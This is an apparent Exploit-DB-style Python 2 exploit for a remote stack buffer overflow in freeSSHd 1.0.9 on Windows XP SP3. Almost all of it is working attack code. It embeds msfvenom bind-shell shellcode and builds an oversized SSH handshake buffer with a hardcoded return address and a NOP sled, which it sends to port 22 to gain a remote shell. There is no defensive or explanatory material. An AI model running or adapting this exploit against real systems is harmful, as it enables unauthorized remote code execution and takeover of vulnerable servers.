"""
Full title:	freeSSHd 1.0.9 Remote Stack Buffer Overflow
Exploit Author:	Paolo Stagno - voidsec@voidsec.com - https://voidsec.com
Vendor Homepage:	http://www.freesshd.com/
Version:	freeSSHd 1.0.9 
Tested on:	Windows XP SP3
Category:	remote exploit
Platform:	windows
"""
#!/usr/bin/python
import socket, sys
import time 
#msfvenom -p windows/shell_bind_tcp -f c -a x86 -b "\x00"
shellcode=("\xbb\x48\x2b\x17\x4c\xd9\xf6\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x53\x31\x5d\x12\x03\x5d\x12\x83\x8d\x2f\xf5\xb9\xf1\xd8\x7b"
"\x41\x09\x19\x1c\xcb\xec\x28\x1c\xaf\x65\x1a\xac\xbb\x2b\x97"
"\x47\xe9\xdf\x2c\x25\x26\xd0\x85\x80\x10\xdf\x16\xb8\x61\x7e"
"\x95\xc3\xb5\xa0\xa4\x0b\xc8\xa1\xe1\x76\x21\xf3\xba\xfd\x94"
"\xe3\xcf\x48\x25\x88\x9c\x5d\x2d\x6d\x54\x5f\x1c\x20\xee\x06"
"\xbe\xc3\x23\x33\xf7\xdb\x20\x7e\x41\x50\x92\xf4\x50\xb0\xea"
"\xf5\xff\xfd\xc2\x07\x01\x3a\xe4\xf7\x74\x32\x16\x85\x8e\x81"
"\x64\x51\x1a\x11\xce\x12\xbc\xfd\xee\xf7\x5b\x76\xfc\xbc\x28"
"\xd0\xe1\x43\xfc\x6b\x1d\xcf\x03\xbb\x97\x8b\x27\x1f\xf3\x48"
"\x49\x06\x59\x3e\x76\x58\x02\x9f\xd2\x13\xaf\xf4\x6e\x7e\xb8"
"\x39\x43\x80\x38\x56\xd4\xf3\x0a\xf9\x4e\x9b\x26\x72\x49\x5c"
"\x48\xa9\x2d\xf2\xb7\x52\x4e\xdb\x73\x06\x1e\x73\x55\x27\xf5"
"\x83\x5a\xf2\x60\x8b\xfd\xad\x96\x76\xbd\x1d\x17\xd8\x56\x74"
"\x98\x07\x46\x77\x72\x20\xef\x8a\x7d\x5f\xac\x03\x9b\x35\x5c"
"\x42\x33\xa1\x9e\xb1\x8c\x56\xe0\x93\xa4\xf0\xa9\xf5\x73\xff"
"\x29\xd0\xd3\x97\xa1\x37\xe0\x86\xb5\x1d\x40\xdf\x22\xeb\x01"
"\x92\xd3\xec\x0b\x44\x77\x7e\xd0\x94\xfe\x63\x4f\xc3\x57\x55"
"\x86\x81\x45\xcc\x30\xb7\x97\x88\x7b\x73\x4c\x69\x85\x7a\x01"
"\xd5\xa1\x6c\xdf\xd6\xed\xd8\x8f\x80\xbb\xb6\x69\x7b\x0a\x60"
"\x20\xd0\xc4\xe4\xb5\x1a\xd7\x72\xba\x76\xa1\x9a\x0b\x2f\xf4"
"\xa5\xa4\xa7\xf0\xde\xd8\x57\xfe\x35\x59\x67\xb5\x17\xc8\xe0"
"\x10\xc2\x48\x6d\xa3\x39\x8e\x88\x20\xcb\x6f\x6f\x38\xbe\x6a"
"\x2b\xfe\x53\x07\x24\x6b\x53\xb4\x45\xbe")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 22))
message = sock.recv(1000)
print message 
buffer = ("\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48"
       "\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00"
       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde")
buffer += "A"*1055
buffer +="\x78\x6A\x83\x7C"#7C836A78
buffer +="\x90"*8
buffer+=shellcode
buffer +="\x90"*(22000-len(buffer))
buffer += "\r\n"
sock.send(buffer)
time.sleep(5)
sock.close()